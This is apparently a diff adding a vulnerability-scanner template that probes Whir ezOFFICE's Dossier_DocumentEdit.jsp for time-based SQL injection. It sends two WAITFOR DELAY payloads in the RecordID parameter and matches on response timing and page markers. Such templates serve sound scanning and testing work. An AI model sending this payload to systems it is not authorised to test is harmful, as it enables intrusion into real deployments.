@@ -1,0 +1,61 @@
+id: poc-yaml-whir-ezoffice-dossier-documentedit-sqli
+info:
+  name: 万户 Dossier_DocumentEdit.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,两高一弱
+
+variables:
+  t1: '{{rand_int(6, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+  t3: '{{rand_int(1, 4)}}'
+  t4: '{{to_number(t3) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp?RecordID=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
+      - type: word
+        part: body
+        words:
+          - "webform.WebOffice.WebSetMsgByName"
+          - "webform.WebOffice.WebUrl="
+      - type: word
+        part: header
+        words:
+          - "iWebOfficeSign"
+
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/Dossier_DocumentEdit.jsp?RecordID=1%27;WAITFOR%20DELAY%20%270:0:{{t3}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= to_number(t3)
+          - duration <= to_number(t4)
+      - type: word
+        part: body
+        words:
+          - "webform.WebOffice.WebSetMsgByName"
+          - "webform.WebOffice.WebUrl="
+      - type: word
+        part: header
+        words:
+          - "iWebOfficeSign"
